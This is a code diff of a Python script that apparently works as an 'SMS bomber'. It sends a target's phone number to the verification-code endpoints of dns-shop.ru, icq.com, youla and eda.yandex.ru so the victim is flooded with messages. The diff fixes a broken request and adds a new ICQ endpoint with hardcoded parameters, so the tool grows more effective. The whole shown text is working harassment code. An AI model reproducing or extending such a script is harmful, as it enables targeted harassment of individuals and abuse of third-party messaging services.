@@ -67,7 +67,7 @@ if t == 2:
                 except:
                     print(colored('icq-[-]', 'yellow'))
                 try:
-                    a = requests.post("https://www.dns-shop.ru/auth/auth/fast-authorization/", headers=headers, data={"FastAuthorizationLoginLoadForm[login]" : phone}, headers=headers)
+                    a = requests.post("https://www.dns-shop.ru/auth/auth/fast-authorization/", data={"FastAuthorizationLoginLoadForm[login]" : phone}, headers=headers)
                     print(colored('dns-shop.ru-[+]', 'magenta'))
                 except:
                     print(colored('dns-shop.ru-[-]', 'magenta'))
@@ -88,6 +88,18 @@ if t == 2:
                     print(colored('youla-[+]', 'magenta'))
                 except:
                     print(colored('youla-[-]', 'magenta'))
+                try:
+                    a = requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={
+                        "msisdn": number,
+                        "locale": "en",
+                        "countryCode": "ru",
+                        "version": "1",
+                        "k": "ic1rtwz1s1Hj1O0r",
+                        "r": "46763"
+                        }, headers=headers)
+                    print(colored('icq.com-[+]', 'cyan'))
+                except:
+                    print(colored('icq.com-[-]', 'cyan'))
                 try:
                     a = requests.post("https://eda.yandex.ru/api/v1/user/request_authentication_code",
                                   json={"phone_number": phone}, headers=headers)
